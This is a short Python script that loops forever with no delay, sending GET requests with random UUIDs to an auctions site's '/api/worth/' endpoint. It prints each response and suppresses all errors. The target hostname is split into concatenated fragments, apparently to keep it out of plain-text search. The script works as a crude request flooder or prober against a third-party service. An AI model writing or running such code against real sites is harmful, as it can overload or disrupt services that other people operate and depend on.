import asyncio
import uuid

import aiohttp


async def main():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                r = await session.get("https://auc" + "tions.cr" + "aft" + "lin" + "k.xyz/ap" + "i/wort" + f"h/{uuid.uuid4().hex}")
                print(await r.text())
        except:
            pass


loop = asyncio.get_event_loop()
loop.run_until_complete(main())
